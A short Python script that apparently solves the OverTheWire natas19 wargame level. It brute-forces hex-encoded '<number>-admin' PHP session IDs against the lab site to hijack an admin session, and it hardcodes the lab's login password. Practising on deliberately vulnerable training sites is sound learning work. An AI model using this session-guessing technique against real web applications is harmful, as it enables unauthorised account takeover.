from requests import post
from requests.auth import HTTPBasicAuth

url = "http://natas19.natas.labs.overthewire.org/"
auth = HTTPBasicAuth("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs")

for i in range(1, 640):
  sessid = (str(i) + "-admin").encode('utf-8').hex()
  r = post(
    url = url,
    auth = auth,
    cookies={
      "PHPSESSID": sessid
    }
  )
  if "The credentials for the next level are" in r.text:
    print(sessid)
    break

